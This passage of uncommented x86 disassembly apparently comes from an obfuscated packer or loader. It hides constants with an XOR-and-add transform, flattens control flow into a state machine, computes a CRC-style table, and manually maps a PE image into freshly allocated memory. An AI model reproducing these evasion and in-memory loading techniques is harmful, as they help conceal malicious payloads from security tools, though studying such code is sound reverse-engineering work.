  419631:	mov    DWORD PTR [ebp-0x14],0xf89c8585
  419638:	mov    DWORD PTR [ebp-0xc],0xf89c8584
  41963f:	mov    DWORD PTR [ebp-0x18],0xf89c8685
  419646:	push   ebx
  419647:	mov    DWORD PTR [ebp-0x1c],0xf89c8586
  41964e:	mov    eax,DWORD PTR [ebp-0x14]
  419651:	push   esi
  419652:	mov    esi,0x751089b
  419657:	push   edi
  419658:	xor    eax,esi
  41965a:	mov    edi,0x3272e2
  41965f:	add    eax,edi
  419661:	mov    DWORD PTR [ebp-0x8],eax
  419664:	mov    DWORD PTR [ebp-0x20],0xf89c85bd
  41966b:	mov    DWORD PTR [ebp-0x4],0xead718a5
  419672:	mov    DWORD PTR [ebp-0x10],0x8
  419679:	mov    ecx,ecx
  41967b:	mov    eax,DWORD PTR [ebp-0xc]
  41967e:	mov    ecx,DWORD PTR [ebp-0x14]
  419681:	xor    eax,esi
  419683:	xor    ecx,esi
  419685:	add    eax,edi
  419687:	add    ecx,edi
  419689:	imul   eax,ecx
  41968c:	jmp    0x4196bf
  41968e:	mov    eax,DWORD PTR [ebp-0x4]
  419691:	sub    eax,edi
  419693:	xor    eax,esi
  419695:	mov    DWORD PTR [ebp-0x8],eax
  419698:	lea    ebx,[ebp-0x8]
  41969b:	call   0x419580
  4196a0:	mov    DWORD PTR [ebp-0x8],eax
  4196a3:	mov    eax,DWORD PTR [ebp-0x8]
  4196a6:	mov    ecx,DWORD PTR [ebp-0x4]
  4196a9:	mov    DWORD PTR [ebp+ecx*4-0x420],eax
  4196b0:	mov    eax,DWORD PTR [ebp-0xc]
  4196b3:	mov    ecx,DWORD PTR [ebp-0x4]
  4196b6:	xor    eax,esi
  4196b8:	lea    eax,[eax+ecx*1+0x3272e2]
  4196bf:	mov    DWORD PTR [ebp-0x4],eax
  4196c2:	mov    eax,DWORD PTR [ebp-0x18]
  4196c5:	mov    ecx,DWORD PTR [ebp-0xc]
  4196c8:	xor    ecx,esi
  4196ca:	xor    eax,esi
  4196cc:	sub    eax,ecx
  4196ce:	mov    ecx,DWORD PTR [ebp-0x4]
  4196d1:	cmp    ecx,eax
  4196d3:	jbe    0x41968e
  4196d5:	mov    eax,DWORD PTR [ebp-0x1c]
  4196d8:	xor    eax,esi
  4196da:	add    eax,edi
  4196dc:	mov    DWORD PTR [ebp-0x8],eax
  4196df:	mov    DWORD PTR [ebp-0x18],0xf89c8686
  4196e6:	mov    ebx,ebx
  4196e8:	jmp    0x41974b
  4196ea:	mov    ecx,DWORD PTR [ebp-0x20]
  4196ed:	mov    eax,DWORD PTR [ebp-0x8]
  4196f0:	xor    ecx,esi
  4196f2:	add    ecx,edi
  4196f4:	shr    eax,cl
  4196f6:	mov    DWORD PTR [ebp-0x4],eax
  4196f9:	mov    eax,DWORD PTR [ebp+0x8]
  4196fc:	mov    cl,BYTE PTR [eax]
  4196fe:	mov    BYTE PTR [ebp+0xb],cl
  419701:	mov    cl,BYTE PTR [ebp+0xb]
  419704:	mov    edx,DWORD PTR [ebp-0x8]
  419707:	movzx  ecx,cl
  41970a:	xor    ecx,edx
  41970c:	mov    DWORD PTR [ebp+0x8],ecx
  41970f:	mov    ecx,DWORD PTR [ebp-0x18]
  419712:	mov    edx,DWORD PTR [ebp+0x8]
  419715:	xor    ecx,esi
  419717:	add    ecx,edi
  419719:	and    ecx,edx
  41971b:	mov    ecx,DWORD PTR [ebp+ecx*4-0x420]
  419722:	mov    edx,DWORD PTR [ebp-0x4]
  419725:	xor    ecx,edx
  419727:	mov    DWORD PTR [ebp-0x8],ecx
  41972a:	mov    ecx,DWORD PTR [ebp-0xc]
  41972d:	xor    ecx,esi
  41972f:	lea    eax,[eax+ecx*1+0x3272e2]
  419736:	mov    DWORD PTR [ebp+0x8],eax
  419739:	mov    eax,DWORD PTR [ebp-0xc]
  41973c:	xor    eax,esi
  41973e:	mov    ecx,0xffcd8d1e
  419743:	sub    ecx,eax
  419745:	add    ecx,DWORD PTR [ebp-0x10]
  419748:	mov    DWORD PTR [ebp-0x10],ecx
  41974b:	mov    eax,DWORD PTR [ebp-0x14]
  41974e:	mov    ecx,DWORD PTR [ebp-0x10]
  419751:	xor    eax,esi
  419753:	add    eax,edi
  419755:	cmp    ecx,eax
  419757:	jne    0x4196ea
  419759:	mov    eax,DWORD PTR [ebp-0x1c]
  41975c:	mov    ecx,DWORD PTR [ebp-0x8]
  41975f:	xor    eax,esi
  419761:	add    eax,edi
  419763:	pop    edi
  419764:	pop    esi
  419765:	xor    eax,ecx
  419767:	pop    ebx
  419768:	leave  
  419769:	ret    0x4
  41976c:	push   ebp
  41976d:	mov    ebp,esp
  41976f:	mov    eax,DWORD PTR [ebp+0x1c]
  419772:	mov    ecx,DWORD PTR [ebp+0x8]
  419775:	mov    edx,DWORD PTR [ebp+0x10]
  419778:	mov    eax,DWORD PTR [eax+0x190]
  41977e:	mov    eax,DWORD PTR [eax]
  419780:	sub    esp,0x64
  419783:	push   ebx
  419784:	push   esi
  419785:	push   edi
  419786:	mov    edi,0x751089b
  41978b:	xor    ecx,edi
  41978d:	mov    ebx,0x3272e2
  419792:	add    ecx,ebx
  419794:	cmp    ecx,edx
  419796:	jne    0x4197a7
  419798:	or     DWORD PTR ds:0x3750c3f,0x4263eb0e
  4197a2:	jmp    0x419ca3
  4197a7:	mov    ecx,DWORD PTR [ebp+0x8]
  4197aa:	mov    esi,DWORD PTR [ebp+0x14]
  4197ad:	mov    edx,DWORD PTR [esi]
  4197af:	xor    ecx,edi
  4197b1:	add    ecx,ebx
  4197b3:	cmp    edx,ecx
  4197b5:	je     0x419c5e
  4197bb:	mov    ecx,DWORD PTR [ebp+0x1c]
  4197be:	mov    DWORD PTR [ebp-0x1c],eax
  4197c1:	mov    DWORD PTR [ebp+0x1c],ecx
  4197c4:	mov    ecx,DWORD PTR [ebp+0x18]
  4197c7:	mov    eax,DWORD PTR [esi]
  4197c9:	mov    DWORD PTR [ebp-0x20],eax
  4197cc:	mov    DWORD PTR [ebp+0x8],0xf89c8585
  4197d3:	mov    edx,0xf89c8584
  4197d8:	mov    DWORD PTR [ebp-0x8],edx
  4197db:	mov    eax,DWORD PTR [ebp+0x1c]
  4197de:	mov    DWORD PTR [ebp+0x1c],eax
  4197e1:	mov    eax,DWORD PTR [ebp+0x1c]
  4197e4:	mov    eax,DWORD PTR [eax+0x190]
  4197ea:	mov    eax,DWORD PTR [eax]
  4197ec:	mov    DWORD PTR [ebp-0x24],ecx
  4197ef:	mov    ecx,DWORD PTR [ebp+0x1c]
  4197f2:	mov    ecx,DWORD PTR [ecx+0x190]
  4197f8:	mov    ecx,DWORD PTR [ecx]
  4197fa:	add    ecx,DWORD PTR [eax+0x3c]
  4197fd:	mov    DWORD PTR [ebp+0x10],ecx
  419800:	mov    eax,DWORD PTR [ebp+0x8]
  419803:	xor    eax,edi
  419805:	add    eax,ebx
  419807:	mov    DWORD PTR [ebp-0x4],eax
  41980a:	mov    eax,DWORD PTR [ebp+0x8]
  41980d:	xor    eax,edi
  41980f:	add    eax,ebx
  419811:	mov    DWORD PTR [ebp+0x18],eax
  419814:	mov    eax,DWORD PTR [ebp+0x10]
  419817:	mov    eax,DWORD PTR [eax+0x50]
  41981a:	sub    eax,0xc
  41981d:	mov    DWORD PTR [ebp-0x28],eax
  419820:	mov    eax,DWORD PTR [ebp+0x10]
  419823:	mov    eax,DWORD PTR [eax+0x38]
  419826:	mov    ecx,DWORD PTR [ebp+0x10]
  419829:	dec    eax
  41982a:	test   DWORD PTR [ecx+0x54],eax
  41982d:	mov    eax,DWORD PTR [ebp+0x10]
  419830:	je     0x41984a
  419832:	mov    eax,DWORD PTR [eax+0x38]
  419835:	mov    ecx,DWORD PTR [ebp+0x10]
  419838:	mov    ecx,DWORD PTR [ecx+0x54]
  41983b:	dec    eax
  41983c:	not    eax
  41983e:	and    ecx,eax
  419840:	mov    eax,DWORD PTR [ebp+0x10]
  419843:	mov    eax,DWORD PTR [eax+0x38]
  419846:	add    eax,ecx
  419848:	jmp    0x41984d
  41984a:	mov    eax,DWORD PTR [eax+0x54]
  41984d:	mov    DWORD PTR [ebp+0x1c],eax
  419850:	mov    eax,DWORD PTR [ebp+0x8]
  419853:	xor    eax,edi
  419855:	add    eax,ebx
  419857:	mov    DWORD PTR [ebp+0x18],eax
  41985a:	mov    eax,DWORD PTR [ebp+0x8]
  41985d:	xor    eax,edi
  41985f:	add    eax,ebx
  419861:	mov    DWORD PTR [ebp+0x18],eax
  419864:	mov    eax,DWORD PTR [ebp+0x8]
  419867:	mov    ecx,DWORD PTR [ebp-0x24]
  41986a:	xor    eax,edi
  41986c:	add    eax,ebx
  41986e:	mov    DWORD PTR [ecx],eax
  419870:	mov    DWORD PTR [ebp+0x18],edx
  419873:	mov    DWORD PTR [ebp+0x18],0xf89c85bb
  41987a:	mov    DWORD PTR [ebp+0x18],0xf89c85ba
  419881:	mov    DWORD PTR [ebp+0x18],0xf89c85b9
  419888:	mov    eax,DWORD PTR [ebp-0x8]
  41988b:	mov    ecx,DWORD PTR [ebp+0x1c]
  41988e:	xor    eax,edi
  419890:	add    eax,ebx
  419892:	imul   eax,ecx
  419895:	mov    ecx,DWORD PTR [ebp+0x8]
  419898:	mov    edx,DWORD PTR [ebp-0x28]
  41989b:	xor    ecx,edi
  41989d:	lea    ecx,[ecx+edx*1+0x3272e2]
  4198a4:	cmp    eax,ecx
  4198a6:	jae    0x419c57
  4198ac:	mov    eax,DWORD PTR [ebp+0x8]
  4198af:	xor    eax,edi
  4198b1:	add    eax,ebx
  4198b3:	mov    DWORD PTR [ebp+0x18],eax
  4198b6:	mov    eax,DWORD PTR [ebp+0x1c]
  4198b9:	add    eax,DWORD PTR [ebp-0x1c]
  4198bc:	mov    DWORD PTR [ebp-0x4],eax
  4198bf:	push   DWORD PTR [ebp-0x4]
  4198c2:	mov    esi,DWORD PTR [ebp-0x1c]
  4198c5:	mov    ecx,DWORD PTR [ebp+0x10]
  4198c8:	call   0x4189c0
  4198cd:	mov    DWORD PTR [ebp+0xc],eax
  4198d0:	mov    DWORD PTR [ebp-0x18],0xf89c85bd
  4198d7:	mov    eax,DWORD PTR [ebp-0x18]
  4198da:	xor    eax,edi
  4198dc:	lea    ecx,[ebp-0x40]
  4198df:	add    eax,ebx
  4198e1:	push   ecx
  4198e2:	call   0x418fa3
  4198e7:	mov    eax,DWORD PTR [ebp+0xc]
  4198ea:	test   eax,eax
  4198ec:	je     0x41993c
  4198ee:	mov    eax,DWORD PTR [ebp-0x18]
  4198f1:	xor    eax,edi
  4198f3:	add    eax,ebx
  4198f5:	push   eax
  4198f6:	push   DWORD PTR [ebp+0xc]
  4198f9:	lea    eax,[ebp-0x40]
  4198fc:	push   eax
  4198fd:	call   0x418e4a
  419902:	mov    eax,DWORD PTR [ebp-0x4]
  419905:	mov    DWORD PTR [ebp-0x18],eax
  419908:	mov    eax,DWORD PTR [ebp-0x18]
  41990b:	mov    ecx,DWORD PTR [ebp-0x1c]
  41990e:	sub    eax,ecx
  419910:	mov    DWORD PTR [ebp-0x18],eax
  419913:	mov    eax,DWORD PTR [ebp+0xc]
  419916:	mov    ecx,DWORD PTR [ebp+0xc]
  419919:	mov    eax,DWORD PTR [eax+0x10]
  41991c:	add    eax,DWORD PTR [ecx+0xc]
  41991f:	mov    ecx,DWORD PTR [ebp-0x18]
  419922:	cmp    ecx,eax
  419924:	jb     0x41993c
  419926:	mov    eax,DWORD PTR [ebp+0xc]
  419929:	mov    eax,DWORD PTR [eax+0xc]
  41992c:	mov    ecx,DWORD PTR [ebp+0xc]
  41992f:	add    eax,DWORD PTR [ecx+0x8]
  419932:	mov    ecx,DWORD PTR [ebp-0x18]
  419935:	sub    eax,ecx
  419937:	jmp    0x419c2a
  41993c:	push   0xc
  41993e:	push   DWORD PTR [ebp-0x4]
  419941:	lea    eax,[ebp-0x4c]
  419944:	push   eax
  419945:	call   0x418e4a
  41994a:	mov    eax,0xf89c8585
  41994f:	mov    DWORD PTR [ebp-0x2c],eax
  419952:	mov    DWORD PTR [ebp-0x30],0xf89c8584
  419959:	mov    DWORD PTR [ebp-0x34],0xf89c85bb
  419960:	mov    DWORD PTR [ebp-0x38],0xf89c85ba
  419967:	lea    ecx,[ebp-0x2c]
  41996a:	mov    DWORD PTR [ebp-0xc],ecx
  41996d:	lea    ecx,[ebp-0x30]
  419970:	mov    DWORD PTR [ebp-0x10],ecx
  419973:	lea    ecx,[ebp-0x34]
  419976:	mov    DWORD PTR [ebp+0xc],ecx
  419979:	lea    ecx,[ebp-0x38]
  41997c:	mov    DWORD PTR [ebp-0x14],ecx
  41997f:	mov    ecx,DWORD PTR [ebp+0x8]
  419982:	xor    ecx,edi
  419984:	add    ecx,ebx
  419986:	mov    DWORD PTR [ebp-0x18],ecx
  419989:	jmp    0x419b85
  41998e:	cmp    eax,0xf89c85bb
  419993:	je     0x419b97
  419999:	mov    ecx,DWORD PTR [ebp-0x8]
  41999c:	xor    ecx,edi
  41999e:	mov    esi,eax
  4199a0:	add    ecx,ebx
  4199a2:	mov    DWORD PTR [ebp+0x18],ecx
  4199a5:	mov    eax,DWORD PTR [ebp-0x18]
  4199a8:	xor    esi,edi
  4199aa:	lea    eax,[eax+esi*1+0x3272e2]
  4199b1:	mov    DWORD PTR [ebp-0x18],eax
  4199b4:	mov    eax,DWORD PTR [ebp-0x8]
  4199b7:	mov    ecx,DWORD PTR [ebp-0x18]
  4199ba:	xor    eax,edi
  4199bc:	add    eax,ebx
  4199be:	cmp    ecx,eax
  4199c0:	jne    0x4199d5
  4199c2:	mov    eax,DWORD PTR [ebp+0x8]
  4199c5:	xor    eax,edi
  4199c7:	add    eax,ebx
  4199c9:	push   eax
  4199ca:	push   0xc
  4199cc:	lea    eax,[ebp-0x4c]
  4199cf:	push   eax
  4199d0:	call   0x4193d7
  4199d5:	mov    eax,DWORD PTR [ebp-0xc]
  4199d8:	mov    eax,DWORD PTR [eax]
  4199da:	xor    eax,edi
  4199dc:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  4199e3:	mov    ecx,DWORD PTR [ebp+0x8]
  4199e6:	xor    ecx,edi
  4199e8:	movzx  eax,al
  4199eb:	add    ecx,ebx
  4199ed:	cmp    eax,ecx
  4199ef:	je     0x419b6d
  4199f5:	mov    eax,DWORD PTR [ebp-0x10]
  4199f8:	mov    eax,DWORD PTR [eax]
  4199fa:	xor    eax,edi
  4199fc:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  419a03:	mov    ecx,DWORD PTR [ebp+0x8]
  419a06:	xor    ecx,edi
  419a08:	movzx  eax,al
  419a0b:	add    ecx,ebx
  419a0d:	cmp    eax,ecx
  419a0f:	je     0x419b6d
  419a15:	mov    eax,DWORD PTR [ebp+0xc]
  419a18:	mov    eax,DWORD PTR [eax]
  419a1a:	xor    eax,edi
  419a1c:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  419a23:	mov    ecx,DWORD PTR [ebp+0x8]
  419a26:	xor    ecx,edi
  419a28:	movzx  eax,al
  419a2b:	add    ecx,ebx
  419a2d:	cmp    eax,ecx
  419a2f:	je     0x419b6d
  419a35:	mov    eax,DWORD PTR [ebp-0x14]
  419a38:	mov    eax,DWORD PTR [eax]
  419a3a:	xor    eax,edi
  419a3c:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  419a43:	mov    ecx,DWORD PTR [ebp+0x8]
  419a46:	xor    ecx,edi
  419a48:	movzx  eax,al
  419a4b:	add    ecx,ebx
  419a4d:	cmp    eax,ecx
  419a4f:	je     0x419b6d
  419a55:	mov    eax,DWORD PTR [ebp-0x10]
  419a58:	mov    eax,DWORD PTR [eax]
  419a5a:	xor    eax,edi
  419a5c:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  419a63:	mov    ecx,DWORD PTR [ebp-0xc]
  419a66:	mov    ecx,DWORD PTR [ecx]
  419a68:	xor    ecx,edi
  419a6a:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  419a71:	xor    al,cl
  419a73:	mov    ecx,DWORD PTR [ebp+0xc]
  419a76:	mov    ecx,DWORD PTR [ecx]
  419a78:	xor    ecx,edi
  419a7a:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  419a81:	or     al,cl
  419a83:	mov    ecx,DWORD PTR [ebp-0xc]
  419a86:	mov    ecx,DWORD PTR [ecx]
  419a88:	xor    ecx,edi
  419a8a:	mov    cl,BYTE PTR [ebp+ecx*1+0x32729a]
  419a91:	cmp    cl,al
  419a93:	jne    0x419b6d
  419a99:	mov    eax,DWORD PTR [ebp+0xc]
  419a9c:	mov    eax,DWORD PTR [eax]
  419a9e:	xor    eax,edi
  419aa0:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  419aa7:	mov    ecx,DWORD PTR [ebp-0x10]
  419aaa:	mov    ecx,DWORD PTR [ecx]
  419aac:	xor    ecx,edi
  419aae:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  419ab5:	xor    al,cl
  419ab7:	mov    ecx,DWORD PTR [ebp-0x14]
  419aba:	mov    ecx,DWORD PTR [ecx]
  419abc:	xor    ecx,edi
  419abe:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  419ac5:	or     al,cl
  419ac7:	mov    ecx,DWORD PTR [ebp-0x10]
  419aca:	mov    ecx,DWORD PTR [ecx]
  419acc:	xor    ecx,edi
  419ace:	mov    cl,BYTE PTR [ebp+ecx*1+0x32729a]
  419ad5:	cmp    cl,al
  419ad7:	jne    0x419b6d
  419add:	mov    eax,DWORD PTR [ebp-0x14]
  419ae0:	mov    eax,DWORD PTR [eax]
  419ae2:	xor    eax,edi
  419ae4:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  419aeb:	mov    ecx,DWORD PTR [ebp+0xc]
  419aee:	mov    ecx,DWORD PTR [ecx]
  419af0:	xor    ecx,edi
  419af2:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  419af9:	xor    al,cl
  419afb:	mov    ecx,DWORD PTR [ebp-0xc]
  419afe:	mov    ecx,DWORD PTR [ecx]
  419b00:	xor    ecx,edi
  419b02:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  419b09:	or     al,cl
  419b0b:	mov    ecx,DWORD PTR [ebp+0xc]
  419b0e:	mov    ecx,DWORD PTR [ecx]
  419b10:	xor    ecx,edi
  419b12:	mov    cl,BYTE PTR [ebp+ecx*1+0x32729a]
  419b19:	cmp    cl,al
  419b1b:	jne    0x419b6d
  419b1d:	mov    eax,DWORD PTR [ebp-0x14]
  419b20:	mov    eax,DWORD PTR [eax]
  419b22:	xor    eax,edi
  419b24:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  419b2b:	mov    ecx,DWORD PTR [ebp-0xc]
  419b2e:	mov    ecx,DWORD PTR [ecx]
  419b30:	xor    ecx,edi
  419b32:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  419b39:	xor    al,cl
  419b3b:	mov    ecx,DWORD PTR [ebp-0x10]
  419b3e:	mov    ecx,DWORD PTR [ecx]
  419b40:	xor    ecx,edi
  419b42:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  419b49:	or     al,cl
  419b4b:	mov    ecx,DWORD PTR [ebp-0x14]
  419b4e:	mov    ecx,DWORD PTR [ecx]
  419b50:	xor    ecx,edi
  419b52:	mov    cl,BYTE PTR [ebp+ecx*1+0x32729a]
  419b59:	cmp    cl,al
  419b5b:	jne    0x419b6d
  419b5d:	lea    eax,[ebp-0x4c]
  419b60:	push   eax
  419b61:	call   0x419628
  419b66:	mov    ecx,DWORD PTR [ebp-0x44]
  419b69:	cmp    eax,ecx
  419b6b:	je     0x419b77
  419b6d:	mov    eax,DWORD PTR [ebp+0x8]
  419b70:	xor    eax,edi
  419b72:	add    eax,ebx
  419b74:	mov    DWORD PTR [ebp+0x18],eax
  419b77:	mov    eax,DWORD PTR [ebp-0x8]
  419b7a:	xor    eax,edi
  419b7c:	lea    eax,[eax+esi*1+0x3272e2]
  419b83:	xor    eax,edi
  419b85:	mov    ecx,DWORD PTR [ebp+0x8]
  419b88:	mov    edx,DWORD PTR [ebp+0x18]
  419b8b:	xor    ecx,edi
  419b8d:	add    ecx,ebx
  419b8f:	cmp    edx,ecx
  419b91:	je     0x41998e
  419b97:	mov    eax,DWORD PTR [ebp+0x8]
  419b9a:	mov    ecx,DWORD PTR [ebp+0x18]
  419b9d:	xor    eax,edi
  419b9f:	add    eax,ebx
  419ba1:	cmp    ecx,eax
  419ba3:	jne    0x419bb6
  419ba5:	mov    eax,DWORD PTR [ebp-0x8]
  419ba8:	mov    ecx,DWORD PTR [ebp+0x1c]
  419bab:	xor    eax,edi
  419bad:	lea    eax,[eax+ecx*1+0x3272e2]
  419bb4:	jmp    0x419c2d
  419bb6:	push   0x18
  419bb8:	push   DWORD PTR [ebp-0x4]
  419bbb:	lea    eax,[ebp-0x64]
  419bbe:	push   eax
  419bbf:	call   0x418e4a
  419bc4:	mov    eax,DWORD PTR [ebp+0x8]
  419bc7:	mov    ecx,DWORD PTR [ebp-0x18]
  419bca:	xor    eax,edi
  419bcc:	add    eax,ebx
  419bce:	cmp    eax,ecx
  419bd0:	je     0x419be5
  419bd2:	mov    eax,DWORD PTR [ebp+0x8]
  419bd5:	xor    eax,edi
  419bd7:	add    eax,ebx
  419bd9:	push   eax
  419bda:	push   0x18
  419bdc:	lea    eax,[ebp-0x64]
  419bdf:	push   eax
  419be0:	call   0x4193d7
  419be5:	mov    eax,DWORD PTR [ebp-0x4]
  419be8:	add    eax,0x18
  419beb:	mov    DWORD PTR [ebp+0x18],eax
  419bee:	push   DWORD PTR [ebp-0x50]
  419bf1:	push   DWORD PTR [ebp+0x18]
  419bf4:	mov    eax,DWORD PTR [ebp-0x54]
  419bf7:	add    eax,DWORD PTR [ebp-0x20]
  419bfa:	push   eax
  419bfb:	call   0x418e4a
  419c00:	mov    eax,DWORD PTR [ebp+0x8]
  419c03:	mov    ecx,DWORD PTR [ebp-0x18]
  419c06:	xor    eax,edi
  419c08:	add    eax,ebx
  419c0a:	cmp    eax,ecx
  419c0c:	je     0x419c1f
  419c0e:	push   0x0
  419c10:	push   DWORD PTR [ebp-0x50]
  419c13:	mov    eax,DWORD PTR [ebp-0x54]
  419c16:	add    eax,DWORD PTR [ebp-0x20]
  419c19:	push   eax
  419c1a:	call   0x4193d7
  419c1f:	mov    eax,DWORD PTR [ebp-0x24]
  419c22:	mov    ecx,DWORD PTR [ebp-0x50]
  419c25:	add    DWORD PTR [eax],ecx
  419c27:	mov    eax,DWORD PTR [ebp-0x50]
  419c2a:	add    eax,DWORD PTR [ebp+0x1c]
  419c2d:	mov    DWORD PTR [ebp+0x1c],eax
  419c30:	mov    eax,DWORD PTR [ebp-0x8]
  419c33:	mov    ecx,DWORD PTR [ebp+0x1c]
  419c36:	xor    eax,edi
  419c38:	add    eax,ebx
  419c3a:	imul   eax,ecx
  419c3d:	mov    ecx,DWORD PTR [ebp+0x8]
  419c40:	mov    edx,DWORD PTR [ebp-0x28]
  419c43:	xor    ecx,edi
  419c45:	lea    ecx,[ecx+edx*1+0x3272e2]
  419c4c:	cmp    eax,ecx
  419c4e:	jb     0x4198ac
  419c54:	mov    esi,DWORD PTR [ebp+0x14]
  419c57:	mov    eax,DWORD PTR [ebp-0x20]
  419c5a:	mov    DWORD PTR [esi],eax
  419c5c:	jmp    0x419ca3
  419c5e:	mov    ecx,DWORD PTR [ebp+0x8]
  419c61:	mov    edx,DWORD PTR [ebp+0xc]
  419c64:	xor    ecx,edi
  419c66:	xor    edx,edi
  419c68:	add    ecx,ebx
  419c6a:	add    edx,ebx
  419c6c:	cmp    ecx,edx
  419c6e:	jne    0x419c82
  419c70:	mov    eax,ds:0x7f642d1e
  419c75:	imul   eax,eax,0x9f15fcef
  419c7b:	mov    ds:0x7f642d1e,eax
  419c80:	jmp    0x419ca3
  419c82:	mov    ecx,DWORD PTR [ebp+0x8]
  419c85:	xor    ecx,edi
  419c87:	add    ecx,ebx
  419c89:	cmp    eax,ecx
  419c8b:	je     0x419c99
  419c8d:	sub    DWORD PTR ds:0xf861e3e,0x709beac2
  419c97:	jmp    0x419ca3
  419c99:	and    DWORD PTR ds:0x3343fa1e,0x5265ec3f
  419ca3:	pop    edi
  419ca4:	pop    esi
  419ca5:	pop    ebx
  419ca6:	leave  
  419ca7:	ret    0x18
  419caa:	push   ebp
  419cab:	mov    ebp,esp
  419cad:	and    esp,0xfffffff8
  419cb0:	mov    eax,DWORD PTR [ebp+0x20]
  419cb3:	sub    esp,0x14
  419cb6:	push   ebx
  419cb7:	mov    ebx,DWORD PTR [ebp+0x14]
  419cba:	push   esi
  419cbb:	push   edi
  419cbc:	cmp    eax,0xf89c8585
  419cc1:	jne    0x419ccd
  419cc3:	push   0xf89c8584
  419cc8:	jmp    0x419dff
  419ccd:	mov    eax,DWORD PTR [ebp+0x20]
  419cd0:	cmp    eax,0xf89c8584
  419cd5:	jne    0x419ce1
  419cd7:	push   0xf89c85bb
  419cdc:	jmp    0x419dff
  419ce1:	mov    eax,DWORD PTR [ebp+0x20]
  419ce4:	cmp    eax,0xf89c85bb
  419ce9:	jne    0x419cf5
  419ceb:	push   0xf89c85ba
  419cf0:	jmp    0x419dff
  419cf5:	mov    eax,DWORD PTR [ebp+0x20]
  419cf8:	cmp    eax,0xf89c85ba
  419cfd:	jne    0x419d09
  419cff:	push   0xf89c85b9
  419d04:	jmp    0x419dff
  419d09:	mov    ecx,DWORD PTR [ebp+0x20]
  419d0c:	mov    eax,0xf89c85be
  419d11:	cmp    ecx,eax
  419d13:	jne    0x419dcf
  419d19:	mov    eax,DWORD PTR [ebp+0x10]
  419d1c:	mov    DWORD PTR [esp+0xc],eax
  419d20:	mov    eax,DWORD PTR [ebp+0x18]
  419d23:	mov    DWORD PTR [esp+0x14],eax
  419d27:	mov    eax,DWORD PTR [ebp+0xc]
  419d2a:	mov    DWORD PTR [esp+0x18],eax
  419d2e:	mov    eax,DWORD PTR [ebp+0x8]
  419d31:	mov    DWORD PTR [esp+0x10],eax
  419d35:	mov    eax,DWORD PTR [esp+0x10]
  419d39:	mov    ecx,DWORD PTR [esp+0x14]
  419d3d:	mov    edi,0x751089b
  419d42:	xor    eax,edi
  419d44:	mov    esi,0x3272e2
  419d49:	add    eax,esi
  419d4b:	mov    DWORD PTR [ecx],eax
  419d4d:	mov    eax,DWORD PTR [esp+0xc]
  419d51:	mov    eax,DWORD PTR [eax+0x194]
  419d57:	mov    ecx,DWORD PTR [eax]
  419d59:	mov    eax,DWORD PTR [esp+0xc]
  419d5d:	mov    eax,DWORD PTR [eax+0x194]
  419d63:	mov    eax,DWORD PTR [eax]
  419d65:	add    eax,DWORD PTR [ecx+0x3c]
  419d68:	mov    ecx,DWORD PTR [esp+0xc]
  419d6c:	mov    ecx,DWORD PTR [ecx+0x1d8]
  419d72:	mov    ecx,DWORD PTR [ecx+0x14]
  419d75:	push   0x4
  419d77:	push   0x3000
  419d7c:	push   DWORD PTR [eax+0x50]
  419d7f:	push   0x0
  419d81:	call   ecx
  419d83:	mov    DWORD PTR [ebx],eax
  419d85:	mov    eax,DWORD PTR [esp+0x10]
  419d89:	push   DWORD PTR [esp+0xc]
  419d8d:	xor    eax,edi
  419d8f:	add    eax,esi
  419d91:	mov    DWORD PTR [esp+0x20],eax
  419d95:	lea    eax,[esp+0x20]
  419d99:	push   eax
  419d9a:	push   ebx
  419d9b:	push   DWORD PTR [esp+0x20]
  419d9f:	push   DWORD PTR [esp+0x28]
  419da3:	push   DWORD PTR [esp+0x24]
  419da7:	call   0x41976c
  419dac:	mov    eax,DWORD PTR [esp+0x10]
  419db0:	mov    ecx,DWORD PTR [ebx]
  419db2:	xor    eax,edi
  419db4:	add    eax,esi
  419db6:	cmp    ecx,eax
  419db8:	je     0x419e16
  419dba:	mov    eax,DWORD PTR [esp+0x18]
  419dbe:	mov    ecx,DWORD PTR [esp+0x14]
  419dc2:	xor    eax,edi
  419dc4:	add    eax,esi
  419dc6:	imul   eax,DWORD PTR [esp+0x1c]
  419dcb:	mov    DWORD PTR [ecx],eax
  419dcd:	jmp    0x419e16
  419dcf:	mov    ecx,DWORD PTR [ebp+0x20]
  419dd2:	cmp    ecx,0xf89c85b9
  419dd8:	jne    0x419de1
  419dda:	push   0xf89c85b8
  419ddf:	jmp    0x419dff
  419de1:	mov    ecx,DWORD PTR [ebp+0x20]
  419de4:	cmp    ecx,0xf89c85b8
  419dea:	jne    0x419df3
  419dec:	push   0xf89c85bf
  419df1:	jmp    0x419dff
  419df3:	mov    ecx,DWORD PTR [ebp+0x20]
  419df6:	cmp    ecx,0xf89c85bf
  419dfc:	jne    0x419e16
  419dfe:	push   eax
  419dff:	push   DWORD PTR [ebp+0x1c]
  419e02:	push   DWORD PTR [ebp+0x18]
  419e05:	push   ebx
  419e06:	push   DWORD PTR [ebp+0x10]
  419e09:	push   DWORD PTR [ebp+0xc]
  419e0c:	push   DWORD PTR [ebp+0x8]
  419e0f:	call   0x419caa
  419e14:	mov    DWORD PTR [ebx],eax
  419e16:	mov    eax,DWORD PTR [ebx]
  419e18:	pop    edi
  419e19:	pop    esi
  419e1a:	pop    ebx
  419e1b:	mov    esp,ebp
  419e1d:	pop    ebp
  419e1e:	ret    0x1c
  419e21:	push   ebp
  419e22:	mov    ebp,esp
  419e24:	sub    esp,0xc
  419e27:	mov    eax,0xf89c8585
  419e2c:	mov    DWORD PTR [ebp-0x8],eax
  419e2f:	mov    DWORD PTR [ebp-0xc],0xf89c8584
  419e36:	mov    ecx,DWORD PTR [ebp-0x8]
  419e39:	xor    ecx,0x751089b
  419e3f:	add    ecx,0x3272e2
